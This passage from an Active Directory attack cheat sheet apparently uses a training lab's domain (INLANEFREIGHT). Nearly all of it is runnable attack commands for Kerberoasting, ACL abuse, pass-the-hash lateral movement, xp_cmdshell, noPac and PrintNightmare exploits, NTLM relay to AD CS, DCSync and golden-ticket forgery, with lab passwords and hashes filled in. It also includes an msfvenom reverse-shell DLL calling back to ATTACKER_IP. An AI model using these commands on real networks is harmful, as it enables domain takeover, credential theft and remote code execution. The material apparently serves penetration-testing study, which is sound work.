    Get-DomainUser -SPN | Get-DomainSPNTicket -Format hashcat
    ```
    ```shell
    # From Linux, using Impacket (will also perform Step 2)
    GetUserSPNs.py INLANEFREIGHT.LOCAL/wley
    ```

* **Step 2: Request the TGS and Extract the Hash**
    ```shell
    # From Windows, using Rubeus
    .\Rubeus.exe kerberoast /nowrap
    ```
    ```shell
    # From Linux, requesting a ticket for a specific service user
    GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
    ```

* **Step 3: Crack the Hash**
    ```shell
    # The mode '13100' is for Kerberos 5, TGS-REP
    hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
    ```

### Access Control List (ACL) Abuse

Every object in AD has an Access Control List (ACL) that defines who can perform what actions on it. Misconfigured ACLs are a direct path to privilege escalation.

* **Finding Abusable ACLs**
    * **What it does:** Uses PowerView to automatically find common, dangerous permissions or to inspect the ACL of a specific high-value object like the "Domain Admins" group.
    * **When to use it:** After running BloodHound, use these commands to get a detailed, real-time view of permissions.
    * **Example Commands:**
        ```powershell
        # Find common misconfigurations across the whole domain
        Find-InterestingDomainAcl -ResolveGUIDs

        # Deep-dive on the Domain Admins group
        Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs
        ```

* **Exploiting Common Abusable Rights**
    * `GenericAll` / `WriteMembers`: Allows you to add yourself to a privileged group.
        ```powershell
        Add-DomainGroupMember -Identity "Remote Desktop Users" -Members "forend"
        ```
    * `ForceChangePassword`: Allows you to reset a user's password without knowing the old one.
        ```powershell
        Set-DomainUserPassword -Identity 'some_privileged_user' -AccountPassword 'NewPassword123!'
        ```
    * `WriteDacl`: The "god mode" right. Allows you to modify an object's permissions. You can use it to grant yourself `GenericAll` or even DCSync rights.

### Executing Lateral Movement

* **What it does:** Uses credentials to gain a shell or execute commands on a remote machine where your user has administrative privileges.
* **When to use it:** Once BloodHound or manual enumeration shows you have `AdminTo` or `CanPSRemote` rights on a target computer.
* **Example Commands:**
    ```powershell
    # From Windows, using native PowerShell Remoting
    $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
    Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
    ```
    ```shell
    # From Linux, using evil-winrm
    evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'
    ```
    ```shell
    # Pass-the-Hash with CrackMapExec to execute a command
    crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf -x "whoami"
    ```
    ```python
    # Using Impacket's psexec.py with a Kerberos ticket
    export KRB5CCNAME=hacker.ccache
    psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass
    ```

### Exploiting Privileged Service Access (MSSQL)

* **What it does:** If you compromise a user who is a sysadmin (`sa`) on an MSSQL server, you can often enable the `xp_cmdshell` procedure to execute commands on the underlying operating system, usually as `NT AUTHORITY\SYSTEM`.
* **When to use it:** When a port scan reveals an MSSQL server (1433) and you have credentials for a high-privileged database user.
* **Example Workflow:**
    ```shell
    # Connect to the SQL server from Linux
    mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
    ```
    ```sql
    -- Inside the SQL shell, enable xp_cmdshell and get a shell
    SQL> enable_xp_cmdshell
    SQL> xp_cmdshell whoami /priv
    ```

-----

## Phase 4: Domain Dominance

This is the endgame. These attacks leverage critical vulnerabilities or abuse core AD mechanisms to seize complete control of the domain, often by obtaining the credentials of the `krbtgt` account. 👑

### "Bleeding Edge" Vulnerabilities

* **noPac (CVE-2021-42278/42287)**: An exploit chain allowing any standard user to become a Domain Admin if DCs are unpatched.
    ```shell
    # Scan for the vulnerability
    sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5
    # Exploit to get a shell on the DC
    sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 --impersonate administrator -shell
    ```
* **PrintNightmare (CVE-2021-1675)**: A vulnerability in the Print Spooler service allowing remote code execution as SYSTEM on vulnerable servers, including DCs.
    ```shell
    # Check if the required RPC endpoints are available
    rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
    # Host a malicious DLL on an SMB share
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -f dll > payload.dll
    sudo smbserver.py -smb2support CompData /path/to/payload/
    # Execute the exploit
    sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\ATTACKER_IP\CompData\payload.dll'
    ```
* **AD CS Relay (ESC8)**: Relaying NTLM authentication from a DC to a misconfigured Active Directory Certificate Services (AD CS) web endpoint to get a certificate that grants you access as the DC.
    ```shell
    # Start the ntlmrelayx listener
    sudo ntlmrelayx.py --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
    # Coerce authentication from the DC using PetitPotam
    python3 PetitPotam.py YOUR_ATTACKER_IP TARGET_DC_IP
    # Use the captured cert to get a TGT and DCSync
    gettgtpkinit.py ... -pfx-base64 <CAPTURED_CERT> dc01.ccache
    export KRB5CCNAME=dc01.ccache
    secretsdump.py -k -no-pass ...
    ```

### DCSync

* **What it does:** An attack that impersonates a Domain Controller and asks another DC to replicate user credential data. This requires specific privileges (`DS-Replication-Get-Changes`). A successful DCSync yields the NTLM hash of every user in the domain, including the `krbtgt` account.
* **When to use it:** Once you have compromised a user who has DCSync rights (often found via BloodHound or ACL enumeration).
* **Example Commands:**
    ```shell
    # From Linux, using secretsdump.py
    secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes <LM:NTLM>
    ```
    ```shell
    # From Windows, using Mimikatz
    # You must be running as a user with DCSync rights
    .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<CERT> /ptt
    mimikatz.exe "lsadump::dcsync /user:inlanefreight\krbtgt"
    ```

### Attacking Domain Trusts

* **What it does:** Exploits trust relationships to escalate privileges from a compromised domain to a trusting one (e.g., from a child domain to the parent forest root). The primary method is the **Inter-Realm Golden Ticket**.
* **When to use it:** When you have compromised the `krbtgt` hash of one domain and want to attack a domain that trusts it.
* **Example Workflow (Golden Ticket):**
    1.  **Enumerate Trusts:**
        ```powershell
        Get-ADTrust -Filter *
        ```
    2.  **Get the `krbtgt` hash** of the trusted domain (e.g., `LOGISTICS.INLANEFREIGHT.LOCAL`) via DCSync.
    3.  **Get the SID of the `Enterprise Admins` group** in the *target* trusting domain (e.g., `INLANEFREIGHT.LOCAL`).
        ```python
        lookupsid.py inlanefreight.local/user@dc01.inlanefreight.local | grep -B12 "Enterprise Admins"
        ```
    4.  **Forge the Golden Ticket** using the trusted domain's `krbtgt` and injecting the target domain's Enterprise Admins SID.
        ```shell
        # Using Mimikatz on Windows
        mimikatz.exe kerberos::golden /user:hacker /domain:LOGISTICS... /krbtgt:<hash> /sids:<target_EA_sid> /ptt
        ```
        ```shell
        # Using Impacket on Linux
        ticketer.py -nthash <hash> -domain LOGISTICS... -extra-sid <target_EA_sid> hacker
        export KRB5CCNAME=hacker.ccache
        ```
    5.  **Access resources in the target domain** with your new Enterprise Admin ticket.
        ```powershell
        # Now that the ticket is in memory, this will work
        ls \\academy-ea-dc01.inlanefreight.local\c$
        ```
